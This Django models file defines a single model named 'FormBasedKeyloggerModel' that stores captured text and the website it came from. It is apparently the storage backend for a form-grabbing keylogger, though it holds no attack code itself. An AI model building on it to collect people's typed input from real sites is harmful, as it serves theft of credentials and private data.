from django.db import models

# Create your models here.
class FormBasedKeyloggerModel(models.Model):
    content = models.CharField(max_length=1000)
    website = models.URLField(max_length=100)